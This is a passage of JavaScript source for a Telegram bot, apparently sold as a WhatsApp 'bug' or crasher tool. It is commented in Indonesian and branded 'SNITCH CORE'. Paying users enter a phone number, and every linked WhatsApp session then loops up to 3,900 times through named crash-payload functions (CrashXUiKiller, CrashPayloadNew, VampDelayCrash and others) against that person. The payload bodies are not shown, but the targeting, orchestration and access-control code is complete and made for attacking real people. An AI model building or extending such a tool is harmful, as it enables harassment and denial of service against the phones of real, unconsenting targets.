  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa mengubah mode Group Only.", {
      parse_mode: "Markdown"
    });
  }

  const state = match[1].toLowerCase();
  settings.groupOnly = state === 'on';

  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Mode *Group Only* telah *${settings.groupOnly ? 'AKTIF' : 'NONAKTIF'}*.`, {
      parse_mode: 'Markdown'
    });
  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal menyimpan pengaturan.", {
      parse_mode: 'Markdown'
    });
    console.error("Gagal menulis settings.json:", error);
  }
});

bot.onText(/^\/grouponly$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  bot.sendMessage(chatId, '❗️Example: /grouponly on');
});

bot.onText(/^\/setcd (\d+)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa mengubah cooldown.", {
      parse_mode: "Markdown"
    });
  }

  const newCd = parseInt(match[1]);
  if (isNaN(newCd) || newCd < 0) {
    return bot.sendMessage(chatId, '⚠️ Masukkan angka yang valid (>= 0).');
  }
  settings.cooldown = newCd;
  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Cooldown berhasil diubah menjadi *${newCd} detik*.`, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error("Gagal menyimpan ke settings.json:", err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menyimpan pengaturan.');
  }
});


bot.onText(/^\/setcd$/, (msg) => {
  bot.sendMessage(msg.chat.id, '❗️Example: /setcd 60');
});


//command crasher
bot.onText(/\/voxstromvip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /voxstromvip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
      //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : voxstromvip
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the ji's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickdelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("DELAY ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/invisiblevip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /invisiblevip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : invisiblevip
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickproto(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("invisiblevip ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


bot.onText(/\/uisystem(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /uisystem 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : uisystem
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickui(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("uisystem ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/trashervip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /trashervip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : trashervip
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await trasher(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("TRASHER ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


// !! [ COMBO FUNCTION SECTION ] !!
// jid itu target
// sock itu nomer bot

//delay function
async function sickdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DELAY ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`DELAY SEND TO ${jid}`));

    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisiOneMess", () => InVisiOneMess(sock, jid, true));
    await safeExec("potterinvis", () => potterinvis(sock, jid, true));
    await safeExec("InVisiOneMess", () => InVisiOneMess(sock, jid, true));
    await safeExec("callNewsletter", () => callNewsletter(sock, jid, true));
    await safeExec("potterinvis", () => potterinvis(sock, jid, true));
    await safeExec("VcardXFc", () => VcardXFc(sock, jid, true));
    await safeExec("callNewsletter", () => callNewsletter(sock, jid, true));
    await safeExec("XdelayTrash", () => XdelayTrash(sock, jid, true));
    await safeExec("LocaBetanew2", () => LocaBetanew2(sock, jid, true));
   await safeExec("XdelayTrash", () => XdelayTrash(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("LocaBetanew2", () => LocaBetanew2(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(2000);
  }

  console.log(`Selesai DELAY ke ${jid} oleh ${sock.user.id}`);
}


//proto function
async function sickproto(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING PROTO ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`PROTO SEND TO ${jid}`));

    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(400);
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await delay(2000);
  }

  console.log(`Selesai PROTO ke ${jid} oleh ${sock.user.id}`);
}


//ui function
async function sickui(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING UI ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`uisystem SENDING TO ${jid}`));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(200);
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(400);
     await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await delay(400);
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai uisystem ke ${jid} oleh ${sock.user.id}`);
}

//trasher function
async function trasher(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING TRASHER ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`TRASHER SENDING TO ${jid}`));
    await safeExec("CursorimgDoc", () => CursorimgDoc(sock, jid));
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("CursorimgDoc", () => CursorimgDoc(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await safeExec("StxCuiSh", () => StxCuiSh(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(400);
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("crashUiV5", () => crashUiV5(sock, jid));
    await safeExec("StxCuiSh", () => StxCuiSh(sock, jid));
    await safeExec("crashUiV5", () => crashUiV5(sock, jid));
    await delay(400);
     await safeExec("splashpayment", () => splashpayment(sock, jid));
     await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("splashpayment", () => splashpayment(sock, jid));
    await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await delay(400);
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai TRASHER ke ${jid} oleh ${sock.user.id}`);
}

// Utility untuk eksekusi aman !! JANGAN DI GANTI KALO GA NGERTI !!
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

// Delay helper !! JANGAN DI HAPUS !!
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

    console.clear();
    console.log(chalk.bold.red("\nSNITCH CORE"));
    console.log(chalk.bold.white("DEVELOPER: SNITCHEZS"));
    console.log(chalk.bold.white("VERSION: 1.0"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER/DEVELOPER"));

    module.exports = {
  sessions,
  sickdelay,
  sickproto,
  sickui,
  trasher
};
